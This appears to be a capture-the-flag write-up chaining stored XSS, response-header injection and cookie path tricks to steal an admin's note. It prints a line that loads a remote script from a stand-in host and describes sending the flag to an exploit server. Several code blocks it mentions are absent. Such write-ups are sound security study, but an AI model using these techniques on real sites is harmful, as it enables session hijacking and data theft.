### Stored XSS

At first glance, it is very clear that the site was vulnerable to XSS. For instance, adding the note `<h1>Test</h1>` results in the heading tags being injected:

When the page is first loaded, the `init()` function is called, and the displayed note's innerHTML is changed to the `/get` response.

Notes are added through a POST request to `/add`.

The `/get` endpoint retrieves notes from the `Notes` map, based on the user's ID cookie.

The `/add` endpoint stores the user's notes, but only if the notes' content is less than 75 characters. In order to create a valid stored XSS payload, we must use a relatively short one.

Note that for all the API endpoints, the following cookies are set to prevent XSS.

Since the notes are fetched based on the user's cookies, we still do not have a way to perform an XSS attack on the admin (we would only be able to do it to ourselves!). 

### Response Header Injection

There is one other API endpoint, though, that we haven't explored. The `/find` endpoint takes the `condition`, `startsWith` , `endsWith` and `debug` parameters. The first three are pretty simple - they help to check if the note starts with or ends with a certain substring.

The `debug` parameter, on the other hand, is quite interesting. If it is set, the 4 parameters above are deleted, and the remaining parameters are looped through. If the key matches the `^[a-zA-Z0-9{}_;-]*$` regex, and the value is less than 50 characters, then the key-value pair is set as a response header.

Remember how we couldn't get the admin to visit our note previously? Well, now we can! All we have to do is to inject a `Set-Cookie` header, setting the admin's ID cookie to our own.

But we still need the original admin's ID (otherwise, how do we get the admin's note?). We can get around that quite easily, though - by simply setting the `Path` of our custom cookie to `/get`, we can make sure that when the admin visits our main site, our custom `id` cookie is used (since the longest match "wins"). However, since the admin's original `id` cookie still exists with the `Path` set to `/`, the `/find` endpoint will still use the original admin ID.

### Crafting Our Payload

_On hindsight, this was way more complex than necessary. The intended solution simply used `eval(window.name)`, since `window.name` can be set by the attacker when using `window.open()`. I'll share mine anyway, because it was quite interesting (to me at least)._

Since we’re in innerHTML, the ideal way is to append a new script element and fetch our external script:

`var newScript = document.createElement("script");newScript.src = "http://www.example.com/my-script.js";this.appendChild(newScript);`

But there’s a 75 character limit in order for the XSS payload to be stored. 

I ended up using cookies, since `document.cookies` will return a string like:

This format is very convenient to create JS code which we can `eval()`. Let the cookie name be `var x`, and the cookie value be `eval(alert())`, and we can run valid JavaScript code using `eval(document.cookie)`:

Since the header values _also_ have a length limit of 50 characters, we need to set multiple cookies. Essentially, the `document.cookies` will return the following string (newlines inserted for clarity):

Here's the script to convert the payload to the necessary URLs to set the cookies:

With some modification of the output, the final exploit script is:

Visiting these URLs set the following cookies. Notice that we have set the `id` cookie with the `/get` path, and that the original `id` with the `/` path is preserved.

After `document.cookie.split('; ').sort()`, the previously inserted cookies will be in the correct order, starting from `var A`, and each subsequent variable builds on top of the previous variable.

`var a` will end up being the full payload:

This is finally eval-ed again (inside the eval) by `var b`.

The XSS payload is then:

This takes up 70 characters, satisfying the length requirement in order to be stored.

Now, we can store this XSS payload! When the admin visits the site, our payload is fetched:

The only thing left now is to perform a CSRF to the `/find` endpoint to get the flag, and make a callback to our exploit server with the data.

### Pwned

This took way too long, because I didn't think of the simple `window.name` payload! 

Regardless, I was excited to finally the flag, after way more pain than necessary.
